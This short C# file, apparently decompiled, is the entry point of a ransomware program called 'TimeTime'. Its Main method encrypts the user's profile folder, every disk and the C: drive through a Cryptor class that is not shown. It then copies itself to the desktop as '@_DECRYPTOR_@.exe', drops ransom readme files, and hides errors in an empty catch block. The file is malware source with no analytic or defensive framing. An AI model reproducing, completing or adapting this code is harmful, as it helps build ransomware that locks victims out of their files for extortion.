using System;
using System.IO;
using System.Windows.Forms;

namespace TimeTime;

internal static class Program
{
	[STAThread]
	private static void Main()
	{
		try
		{
			Cryptor.TryEncryptFolder(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
			Cryptor.EncryptDisks();
			Cryptor.EncryptFolder("C:\\");
			File.Copy(Application.get_ExecutablePath(), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\@_DECRYPTOR_@.exe");
			Cryptor.DropReadmes();
		}
		catch (Exception)
		{
		}
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		Application.Run((Form)(object)new Form1());
	}
}
